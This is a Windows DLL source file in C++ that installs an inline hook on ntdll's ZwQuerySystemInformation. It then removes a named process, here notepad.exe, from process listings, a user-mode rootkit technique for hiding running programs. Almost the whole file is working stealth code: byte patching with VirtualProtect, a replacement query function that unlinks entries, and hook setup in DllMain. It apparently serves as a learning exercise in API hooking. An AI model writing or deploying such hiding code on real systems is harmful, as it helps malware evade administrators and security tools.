// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"
#include <Windows.h>
#include <tchar.h>

#define STATUS_SUCCESS (0x00000000L) 

typedef LONG NTSTATUS;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemBasicInformation = 0,
	SystemPerformanceInformation = 2,
	SystemTimeOfDayInformation = 3,
	SystemProcessInformation = 5,
	SystemProcessorPerformanceInformation = 8,
	SystemInterruptInformation = 23,
	SystemExceptionInformation = 33,
	SystemRegistryQuotaInformation = 37,
	SystemLookasideInformation = 45
} SYSTEM_INFORMATION_CLASS;

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _SYSTEM_PROCESS_INFORMATION {
	ULONG NextEntryOffset;
	ULONG NumberOfThreads;
	BYTE Reserved1[48];
	UNICODE_STRING ImageName;
	LONG BasePriority;
	HANDLE UniqueProcessId;
	PVOID Reserved2;
	ULONG HandleCount;
	ULONG SessionId;
	PVOID Reserved3;
	SIZE_T PeakVirtualSize;
	SIZE_T VirtualSize;
	ULONG Reserved4;
	SIZE_T PeakWorkingSetSize;
	SIZE_T WorkingSetSize;
	PVOID Reserved5;
	SIZE_T QuotaPagedPoolUsage;
	PVOID Reserved6;
	SIZE_T QuotaNonPagedPoolUsage;
	SIZE_T PagefileUsage;
	SIZE_T PeakPagefileUsage;
	SIZE_T PrivatePageCount;
	LARGE_INTEGER Reserved7[6];
} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;

typedef NTSTATUS(WINAPI *PFZWQUERYSYSTEMINFORMATION)
(SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength);

#define DEF_NTDLL                       ("ntdll.dll")
#define DEF_ZWQUERYSYSTEMINFORMATION    ("ZwQuerySystemInformation")


#pragma comment(linker,"/SECTION:.SHARE,RWS")
#pragma data_seg(".SHARE")
TCHAR g_szProcName[MAX_PATH] = { 0, };
#pragma data_seg()



BYTE g_pOrgBytes[5] = { 0, };



BOOL hook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PROC pfnNew, PBYTE pOrgBytes)
{
	FARPROC pfnOrg;
	DWORD dwOldProtect;
	DWORDLONG dwAddress;
	BYTE pBuf[5] = { 0xE9,0, };
	PBYTE pByte;


	pfnOrg = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);
	pByte = (PBYTE)pfnOrg;


	if (pByte[0] == 0xE9)
		return FALSE;


	VirtualProtect((LPVOID)pfnOrg, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);


	memcpy(pOrgBytes, pfnOrg, 5);


	dwAddress = (DWORDLONG)pfnNew - (DWORDLONG)pfnOrg - 5;


	memcpy(&pBuf[1], &dwAddress, 4);


	memcpy(pfnOrg, pBuf, 5);


	VirtualProtect((LPVOID)pfnOrg, 5, dwOldProtect, &dwOldProtect);

	return TRUE;

}

BOOL unhook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PBYTE pOrgByte)
{
	FARPROC pFunc;
	DWORD dwOldProtect;
	PBYTE pByte;

	pFunc = GetProcAddress(GetModuleHandleA(szDllName), szFuncName);
	pByte = (PBYTE)pFunc;

	if (pByte[0] != 0xE9)
		return FALSE;

	VirtualProtect((LPVOID)pFunc, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);


	memcpy(pFunc, pOrgByte, 5);

	VirtualProtect((LPVOID)pFunc, 5, dwOldProtect, &dwOldProtect);

	return TRUE;
}


NTSTATUS WINAPI NewZwQuerySystemInformation(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength)
{
	NTSTATUS status;
	FARPROC pFunc;
	PSYSTEM_PROCESS_INFORMATION pCur, pPrev = NULL;
	char szProcName[MAX_PATH] = { 0, };
	TCHAR info[100] = { 0, };


	unhook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, g_pOrgBytes);

	//_stprintf_s(info, _T("Sizeof SYSTEM_PROCESS_INFORMATION : %x"), sizeof(SYSTEM_PROCESS_INFORMATION));
	//OutputDebugString(info);
	pFunc = GetProcAddress(GetModuleHandleA(DEF_NTDLL), DEF_ZWQUERYSYSTEMINFORMATION);
	status = ((PFZWQUERYSYSTEMINFORMATION)pFunc)(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
	if (status != STATUS_SUCCESS)
		goto __NTQUERYSYSTEMINFORMATION_END;


	if (SystemInformationClass == SystemProcessInformation)
	{
		pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;

		
		for (; pCur != pPrev; pCur = (PSYSTEM_PROCESS_INFORMATION)((ULONGLONG)pCur + pCur->NextEntryOffset))
		{
			if (pCur->ImageName.Buffer != NULL)
			{
				OutputDebugString(pCur->ImageName.Buffer);
				if (!_tcsicmp((PWSTR)pCur->ImageName.Buffer, g_szProcName))
				{
					pPrev->NextEntryOffset += pCur->NextEntryOffset;
					if (pCur->NextEntryOffset == 0)
					{
						pPrev->NextEntryOffset = 0;
					}
				}
			}
			pPrev = pCur;
		}

		/*
		while (TRUE)
		{
			if (pCur->ImageName.Buffer != NULL)
			{
				if (!_tcsicmp((PWSTR)pCur->ImageName.Buffer, g_szProcName))
				{
					if (pCur->NextEntryOffset == 0)
					{
						pPrev->NextEntryOffset = 0;
					}
					else if (pPrev != NULL)
					{
						OutputDebugString(pCur->ImageName.Buffer);
						pPrev->NextEntryOffset += pCur->NextEntryOffset;
					}

				}
				else
					pPrev = pCur;
			}

			if (pCur->NextEntryOffset == 0)
				break;

			pCur = (PSYSTEM_PROCESS_INFORMATION)((ULONGLONG)pCur + pCur->NextEntryOffset);
		}
		*/

	}
__NTQUERYSYSTEMINFORMATION_END:
	hook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, (PROC)NewZwQuerySystemInformation, g_pOrgBytes);
	return status;
}



BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{

	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		_tcscpy_s(g_szProcName, L"notepad.exe");
		hook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, (PROC)NewZwQuerySystemInformation, g_pOrgBytes);

		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		unhook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, g_pOrgBytes);
		break;
	}
	return TRUE;
}

